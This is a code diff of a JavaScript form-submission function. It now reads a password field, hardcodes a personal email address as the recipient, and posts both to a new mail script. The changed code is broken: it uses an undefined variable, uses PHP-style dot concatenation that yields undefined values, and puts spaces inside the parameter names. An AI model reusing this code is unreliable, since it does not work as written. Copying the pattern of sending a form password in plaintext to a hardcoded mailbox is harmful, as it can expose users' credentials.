@@ -23,8 +23,10 @@ function submitform(e, sender) {
     e.preventDefault();
 
     var subject = getIdValue('subject');
-    var message = getIdValue('message');
-    var vars = "message=" + message + "&subject=" + subject;
+    var body = getIdValue('message');
+    var password = getIdValue('password');
+    var to = "okanlawonemmanuel41@gmail.com"
+    var vars = "body=" + message + "&subject=" + subject + "&password = ".password+"&to = ".to;
     var msg = document.getElementById("alert");
 
 
@@ -32,7 +34,7 @@ function submitform(e, sender) {
 
 
     hr = new XMLHttpRequest()
-    url = "../solar/msg-api.php";
+    url = "../../../sendmailajax.php";
     hr.open("POST", url, true);
 
     hr.setRequestHeader("Content-type", "application/x-www-form-urlencoded", true);
